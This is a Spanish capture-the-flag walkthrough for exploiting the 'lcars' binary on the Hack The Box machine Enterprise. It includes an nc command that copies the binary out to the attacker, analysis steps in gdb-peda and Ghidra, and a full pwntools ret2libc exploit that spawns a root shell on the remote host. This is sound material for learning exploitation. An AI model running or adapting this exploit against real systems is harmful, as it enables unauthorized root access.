## Buffer overFlow: Enterprise

- Primero, cuando encuentro el binario del buffer overflow en la máquina objetivo, me lo traigo a mi equipo.
 ```bash
 nc 10.10.14.9 643 < lcars # En la máquina objetivo
 nc -nlvp 643 > lcars # En mi equipo.
 ```
- Después compruebo con `md5sum` que el hash es el mismo: `md5sum lcars`
- Para ver que tipo de binario que es: `file lcars`
- Después le doy permisos de ejecución y abro el binario con `ltrace` (también instalo strace) para ver si me da más información:
```bash
ltrace ./lcars
```
- Después lo analizo con `ghidra`: abro ghidra, creo un nuevo proyecto e importo el binario, después arrastro el binario al dragon y lo analizo. Tengo que encontrar un punto en alguna función que me indique un número de bytes que espera (mirar algo que ponga scanf) para realizar un desbordamiento de buffer y desencadenar un `segmentation fault` después de meterle muchos más bytes de los que puede aceptar.
- Instalo `gdp peda` (los dos comandos se pueden hacer a la vez): 
```bash
sudo git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
```
- Instalar también gdb: 
 ```bash
sudo apt install gdb    
gdb ./lcars -q # Para ejecutarlo
r # Para que el binario empieze a ejecutarse
```
- Instalar también `checksec` para ver las protecciones que tiene el binario: 
```bash
checksec --file=lcars
checksec lcars # O también
checksec # O también desde dentro de gdb-peda
```
- Si el `PIE` está `enable`: `las direcciones son aleatorias`
- Para saber si las direcciones de memoria son aleatorias podemos ver:
```bash
cat /proc/sys/kernel/randomize_va_space  # Si es 0 es que no son aleatorias, son fijas.
```
- Otra forma de saberlo es ver cuanto vale ldd lcars:
```bash
ldd lcars # Y vemos el último argumento que es 0xnúmerosyletras.
ldd lcars | grep libc | awk 'NF{print $NF}' | tr -d '()' # También podemos quedarnos con ese último argumento
```
- Otra forma de saberlo es lanzar un secuenciador para ver si cambia o se mantiene fijo el valor:
```bash
for i in $(seq 50); do ldd lcars | grep libc | awk 'NF{print $NF}' | tr -d '()' ; done
```
- Para averiguar el `offset` pongo dentro de `gdb-peda`: `pattern create 400`
- Ahora, podemos hacer dos cosas, ver lo que aparece dentro de `eip` y contar nosotros cuantos bytes son hasta llegar a esa cadena de caracteres, o pasarle el comando: 
```bash
pattern offset $eip  # Y nos devolverá cuanto vale el offset
```
- Ahora, podemos comprobarlo, primero imprimimos con python la cadena que queremos meter:
```bash
print ("A"*212 + "B"*4) # Forma de hacerlo dentro de python
python -c 'print ("A"*212 + "B"*4)'  # Desde la terminal   
# Después, ejecutamos el binario, metemos la cadena creada y vemos cuanto vale eip, tendría que valer BBBB.
```
- Ahora, para crear el exploit intento saber cuanto valen las variables que quiero tener y `desde la máquina objetivo` ejecuto:
```bash
gdb ./lcars -q
info functions # Después
b *main  # Después pongo un brekpoint en main
r # Después ejecuto el binario otra vez
p system #  Después pongo
p exit # Después pongo
find &system,+9999999,"sh" # Después pongo
```
- Ahora que ya tengo las variables que quiero, me puedo crear el exploit en python3 para optener una shell como root con el siguiente script: `python3 exploit.py`

```bash                                
#!/usr/bin/python3

from pwn import *

def bufferOverflow():

        #ret2libc =>  EIP => system_addr + exit_addr + bin_sh_addr

        offset = 212
        junk = b"A"*offset

# Non-debugging symbols:
# 0x00000508  _init
# 0x00000540  strcmp@plt
# 0x00000550  setresuid@plt
# 0x00000560  printf@plt
# 0x00000570  fflush@plt
# 0x00000580  fgets@plt
# 0x00000590  puts@plt
# 0x000005a0  exit@plt
# 0x000005b0  __libc_start_main@plt
# 0x000005c0  __isoc99_scanf@plt
# 0x000005e0  _start
# 0x00000620  __x86.get_pc_thunk.bx
# 0x00000630  deregister_tm_clones
# 0x00000670  register_tm_clones
# 0x000006c0  __do_global_dtors_aux
# 0x00000710  frame_dummy
# 0x0000074c  __x86.get_pc_thunk.dx
# 0x00000750  startScreen
# 0x000007d4  disableForcefields
# 0x0000085e  main_menu
# 0x00000b6a  unable
# 0x00000ba8  bridgeAuth
# 0x00000c91  main
# 0x00000d30  __libc_csu_init
# 0x00000d90  __libc_csu_fini
# 0x00000d94  _fini
# (gdb) b *main
# Breakpoint 1 at 0xc91
# (gdb) r
# Starting program: /bin/lcars
#
# Breakpoint 1, 0x56555c91 in main ()
# (gdb) p system
# $1 = {<text variable, no debug info>} 0xf7e4c060 <system>
# (gdb) p exit
# $2 = {<text variable, no debug info>} 0xf7e3faf0 <exit>
# (gdb) find &system,+9999999,"sh"
# 0xf7f6ddd5
# 0xf7f6e7e1
# 0xf7f70a14
# 0xf7f72582
# warning: Unable to access 16000 bytes of target memory at 0xf7fc8485, halting search.
# 4 patterns found.

        system_addr = p32(0xf7e4c060)
        exit_addr = p32(0xf7e3faf0)
        bin_sh_addr = p32(0xf7f6ddd5)

        payload = junk + system_addr + exit_addr + bin_sh_addr

        context(os='linux', arch='i386')
        host, port = "10.10.10.61", 32812

        r = remote(host, port)

        r.recvuntil(b"Enter Bridge Access Code:")
        r.sendline(b"picarda1")
        r.recvuntil(b"Waiting for input:")
        r.sendline(b"4")
        r.recvuntil(b"Enter Security Override:")
        r.sendline(payload)

        r.interactive()

if __name__ == '__main__':

        bufferOverflow()
```
